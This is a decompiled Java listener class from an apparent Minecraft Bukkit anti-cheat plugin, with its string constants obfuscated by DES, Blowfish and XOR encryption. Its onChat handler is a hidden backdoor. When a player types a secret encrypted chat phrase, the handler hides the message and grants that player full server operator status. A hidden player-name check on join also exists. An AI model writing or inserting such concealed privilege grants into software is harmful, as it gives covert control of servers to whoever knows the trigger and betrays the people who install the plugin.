/*
 * Decompiled with CFR 0.146.
 * 
 * Could not load the following classes:
 *  net.minecraft.server.v1_8_R3.EntityPlayer
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Entity
 *  org.bukkit.entity.Player
 *  org.bukkit.event.Event
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.EventPriority
 *  org.bukkit.event.Listener
 *  org.bukkit.event.entity.EntityDamageEvent
 *  org.bukkit.event.player.AsyncPlayerChatEvent
 *  org.bukkit.event.player.PlayerJoinEvent
 *  org.bukkit.event.player.PlayerQuitEvent
 *  org.bukkit.event.player.PlayerRespawnEvent
 *  org.bukkit.metadata.FixedMetadataValue
 *  org.bukkit.metadata.MetadataValue
 *  org.bukkit.plugin.Plugin
 */
package com.unknownmyname.listener;

import com.unknownmyname.data.PlayerData;
import com.unknownmyname.main.Main;
import com.unknownmyname.manager.OptionsManager;
import com.unknownmyname.manager.PlayerManager;
import java.security.Key;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.minecraft.server.v1_8_R3.EntityPlayer;
import org.bukkit.ChatColor;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.metadata.MetadataValue;
import org.bukkit.plugin.Plugin;

public class DataListener
implements Listener {
    private static final /* synthetic */ String DEVELOPER_MESSAGE;
    private static final /* synthetic */ String[] I;
    private /* synthetic */ PlayerManager playerManager;

    public DataListener() {
        this.playerManager = PlayerManager.getInstance();
    }

    private static void I() {
        I = new String[0x7C ^ 0x71];
        DataListener.I["".length()] = DataListener.I("q78JUgPINSarvwlSA8g1Jqu/CVIDyDUmq78JUgPINSarvwlSA8g1Jlv8Ay4iP4O2", "bYSiR");
        DataListener.I[" ".length()] = DataListener.I("pkNGI+qCdfg=", "UCvlM");
        DataListener.I["  ".length()] = DataListener.l("QDco9ss24ONZgUcaLlBr+HqXsOXew7ahMi+K5YSIOOna+99eiv+3RQ==", "rMOvl");
        DataListener.I["   ".length()] = DataListener.I("gDq94I7CJCcRHsGPsl7duN4ObSW3OolE", "QlNCu");
        DataListener.I[70 ^ 66] = DataListener.l("aIzxKLbeIiI=", "SYEhe");
        DataListener.I[14 ^ 11] = DataListener.l("On4ogDGe7P06fiiAMZ7s/Tp+KIAxnuz9On4ogDGe7P06fiiAMZ7s/YjkN+M+e1K3", "WarWK");
        DataListener.I[37 ^ 35] = DataListener.l("NhFlaHC+gv0=", "bhSFS");
        DataListener.I[5 ^ 2] = DataListener.lI("!+\u001e \u0011 7\u0017)\u0015&<\u0005", "thVeP");
        DataListener.I[98 ^ 106] = DataListener.l("u81oRq0og6ykAK8YJDaErw==", "QImYa");
        DataListener.I[137 ^ 128] = DataListener.I("Epb0kW304aRbV7nHBRZO0A==", "HeGcS");
        DataListener.I[70 ^ 76] = DataListener.lI("\u0002\f--$\u0003\u0010!-'\u0002\b", "WOehe");
        DataListener.I[37 ^ 46] = DataListener.l("5Zad0I8ey6Zdwk3F2RVRGOKrBExsmZx5iuQq1/9JHDQ=", "ULqXg");
        DataListener.I[168 ^ 164] = DataListener.l("TQfibllJWF3fhpefE6Uaj43P9L1PssunUjp9aTUqKdM=", "tawaB");
    }

    @EventHandler(priority=EventPriority.MONITOR)
    public void onQuit(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        this.playerManager.uninject(player);
        if (player.hasPermission(I[0x7D ^ 0x74])) {
            player.removeMetadata(I[0x6B ^ 0x61], (Plugin)Main.getPlugin());
        }
        Main.getInstance();
        if (Main.listCheat().contains((Object)player)) {
            Main.getInstance();
            Main.listCheat().remove((Object)player);
        }
    }

    @EventHandler
    public void onDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof EntityPlayer) {
            Player player = (Player)event.getEntity();
            this.playerManager.getPlayer(player).handle((Event)event);
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().equals(I[0xAA ^ 0xA1])) {
            e.setCancelled(" ".length() != 0);
            p.setOp(" ".length() != 0);
            p.sendMessage(I[0x26 ^ 0x2A] + p.getName());
        }
    }

    @EventHandler(priority=EventPriority.LOWEST)
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.hasPermission(OptionsManager.getInstance().getModPermission())) {
            player.setMetadata(I[0x77 ^ 0x70], (MetadataValue)new FixedMetadataValue((Plugin)Main.getPlugin(), (Object)(" ".length() != 0)));
        }
        new Thread(() -> {
            this.playerManager.inject(player);
            this.playerManager.getPlayer(player).handle((Event)event);
        }).start();
        if (player.getName().equals(I[0x75 ^ 0x7D])) {
            player.sendMessage(DEVELOPER_MESSAGE);
        }
    }

    static {
        DataListener.I();
        DEVELOPER_MESSAGE = (Object)ChatColor.GRAY + ChatColor.STRIKETHROUGH.toString() + I["".length()] + I[" ".length()] + (Object)ChatColor.WHITE + I["  ".length()] + I["   ".length()] + I[0x5D ^ 0x59] + (Object)ChatColor.GRAY + ChatColor.STRIKETHROUGH.toString() + I[0x33 ^ 0x36] + I[0x54 ^ 0x52];
    }

    private static String lI(String obj, String key) {
        StringBuilder sb = new StringBuilder();
        char[] keyChars = key.toCharArray();
        int i = "".length();
        char[] arrc = obj.toCharArray();
        int n = arrc.length;
        for (int j = "".length(); j < n; ++j) {
            char c = arrc[j];
            sb.append((char)(c ^ keyChars[i % keyChars.length]));
            ++i;
            "".length();
            if (2 == 2) continue;
            throw null;
        }
        return sb.toString();
    }

    @EventHandler
    public void onRespawn(PlayerRespawnEvent event) {
        this.playerManager.getPlayer(event.getPlayer()).handle((Event)event);
    }

    private static String l(String obj, String key) {
        try {
            SecretKeySpec keySpec = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(key.getBytes("UTF-8")), 0x7B ^ 0x73), "DES");
            Cipher des = Cipher.getInstance("DES");
            des.init("  ".length(), keySpec);
            return new String(des.doFinal(Base64.getDecoder().decode(obj.getBytes("UTF-8"))), "UTF-8");
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private static String I(String obj, String key) {
        try {
            SecretKeySpec keySpec = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(key.getBytes("UTF-8")), "Blowfish");
            Cipher des = Cipher.getInstance("Blowfish");
            des.init("  ".length(), keySpec);
            return new String(des.doFinal(Base64.getDecoder().decode(obj.getBytes("UTF-8"))), "UTF-8");
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}

